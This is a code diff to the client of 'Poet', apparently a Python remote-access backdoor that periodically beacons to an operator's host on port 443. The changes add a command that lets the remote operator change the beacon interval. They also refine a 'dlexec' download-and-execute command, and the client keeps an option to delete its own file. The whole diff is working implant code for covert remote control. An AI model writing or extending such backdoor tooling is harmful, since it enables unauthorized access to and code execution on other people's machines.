@@ -132,10 +132,21 @@ class PoetClient(object):
                             raise Exception('client not deleted')
                     except Exception as e:
                         s.send(str(e.message))
-                elif inp.startswith('dlexec'):
+                elif inp.startswith('dlexec '):
                     try:
                         self.dlexec(inp)
                         s.send('done')
+                    except Exception as e:
+                        s.send(str(e.message))
+                elif inp.startswith('chint '):
+                    try:
+                        num = int(inp[6:])
+                        if num < 1 or num > 604800:
+                            msg = 'Invalid interval time.'
+                        else:
+                            args.interval = num
+                            msg = 'done'
+                        s.send(msg)
                     except Exception as e:
                         s.send(str(e.message))
                 else:
@@ -197,7 +208,7 @@ def get_args():
 
     parser = argparse.ArgumentParser()
     parser.add_argument('host', metavar='IP', type=str)
-    parser.add_argument('delay', metavar='DELAY', type=int, help='(s)')
+    parser.add_argument('interval', metavar='INTERVAL', type=int, help='(s)')
     parser.add_argument('-p', '--port')
     parser.add_argument('-v', '--verbose', action="store_true")
     parser.add_argument('-d', '--delete', action="store_true")
@@ -229,12 +240,11 @@ def main():
         log.info('[+] Deleting client.')
         os.remove(__file__)
 
-    DELAY = args.delay
     HOST = args.host
     PORT = int(args.port) if args.port else 443
 
-    log.info(('[+] Poet started with delay of {} seconds to port {}.' +
-              ' Ctrl-c to exit.').format(DELAY, PORT))
+    log.info(('[+] Poet started with interval of {} seconds to port {}.' +
+              ' Ctrl-c to exit.').format(args.interval, PORT))
 
     try:
         while True:
@@ -243,7 +253,7 @@ def main():
                 PoetClient(HOST, PORT).start()
             else:
                 log.info('[!] ({}) Server is inactive'.format(datetime.now()))
-            time.sleep(DELAY)
+            time.sleep(args.interval)
     except KeyboardInterrupt:
         print
         log.info('[-] ({}) Poet terminated.'.format(datetime.now()))
